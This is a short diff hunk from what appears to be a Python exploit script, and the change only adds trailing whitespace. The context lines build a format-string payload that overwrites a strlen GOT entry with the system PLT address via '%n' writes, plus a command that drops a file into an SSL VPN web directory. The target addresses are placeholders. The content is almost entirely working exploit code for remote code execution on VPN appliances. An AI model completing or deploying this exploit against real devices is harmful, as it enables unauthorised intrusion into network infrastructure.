@@ -10,7 +10,7 @@ cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt"
 strlen_GOT = 0x667788  # change me
 system_plt = 0x445566  # change me
 
-fmt = '%70$n'
+fmt = '%70$n'    
 fmt += '%' + str((system_plt >> 16) & 0xff) + 'c'
 fmt += '%32$hn'
 fmt += '%' + str((system_plt & 0xffff) - ((system_plt >> 16) & 0xff)) + 'c'
